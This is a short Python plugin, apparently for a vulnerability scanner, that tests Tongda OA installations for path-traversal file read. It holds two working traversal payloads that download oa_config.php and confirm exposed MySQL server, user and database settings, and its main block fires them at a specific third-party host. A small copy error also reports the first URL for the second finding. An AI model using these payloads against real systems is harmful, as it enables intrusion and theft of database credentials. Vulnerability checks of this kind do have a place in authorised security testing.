#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__ = junjunbxj
#__Service_ = 极限OA办公系统
#__Refer___ = http://wooyun.org/bugs/wooyun-2010-0126661

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg
    
def audit(arg):
    payload1 = 'general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
    payload2 = 'module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php'
    
    url1 = arg + payload1
    code1, head, body1, errcode, _url = curl.curl2(url1)
    if code1 == 200 and '$MYSQL_SERVER' in body1 and '$MYSQL_USER' in body1 and '$MYSQL_DB' in body1:
        security_hole(url1 + 'Arbitrary File Download')
    url2 = arg + payload2
    code2, head, body2, errcode, _url = curl.curl2(url2)
    if code2 == 200 and '$MYOA_SESS_SAVE_HANDLER' in body2:
        security_hole(url1 + '\nArbitrary File read')



if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://www.qfyz.net:8080/')[1])
    audit(assign('tongdaoa', 'http://www.qfyz.net:8080/')[1])